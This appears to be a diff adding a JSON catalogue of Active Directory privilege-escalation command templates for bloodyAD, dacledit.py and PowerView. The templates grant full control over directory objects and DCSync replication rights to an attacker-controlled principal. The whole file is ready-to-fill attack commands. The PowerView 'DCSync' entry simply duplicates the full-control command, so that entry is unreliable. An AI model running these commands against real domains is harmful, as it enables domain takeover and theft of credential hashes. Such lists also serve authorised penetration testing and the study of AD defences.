@@ -1,0 +1,34 @@
+{
+  "commands": [
+    {
+      "title": "Grant Full Control with bloodyAD",
+      "description": "Grant full control including inheritance on the target object.",
+      "template": "bloodyAD --host \"{ip}\" -d \"{domain}\" -u \"{username}\" -p \"{password}\" add genericAll \"{target_object}\" \"{controlled_principal}\""
+    },
+    {
+      "title": "Grant DCSync Rights with bloodyAD",
+      "description": "Grant replication rights (DCSync) to the controlled principal.",
+      "template": "bloodyAD --host \"{ip}\" -d \"{domain}\" -u \"{username}\" -p \"{password}\" add dcsync \"{controlled_principal}\""
+    },
+    {
+      "title": "Grant Full Control with dacledit.py",
+      "description": "Use dacledit.py to grant full control rights.",
+      "template": "dacledit.py -action write -rights FullControl -principal \"{controlled_principal}\" -target \"{target_object}\" \"{domain}/{username}\":\"{password}\""
+    },
+    {
+      "title": "Grant DCSync Rights with dacledit.py",
+      "description": "Use dacledit.py to grant DCSync rights.",
+      "template": "dacledit.py -action write -rights DCSync -principal \"{controlled_principal}\" -target \"{target_object}\" \"{domain}/{username}\":\"{password}\""
+    },
+    {
+      "title": "Grant Full Control with PowerView",
+      "description": "PowerView command to grant full control permissions.",
+      "template": "Add-DomainObjectAcl -Rights All -TargetIdentity \"{target_object}\" -PrincipalIdentity \"{controlled_principal}\""
+    },
+    {
+      "title": "Grant DCSync Rights with PowerView",
+      "description": "PowerView command to grant DCSync permissions.",
+      "template": "Add-DomainObjectAcl -Rights All -TargetIdentity \"{target_object}\" -PrincipalIdentity \"{controlled_principal}\""
+    }
+  ]
+}
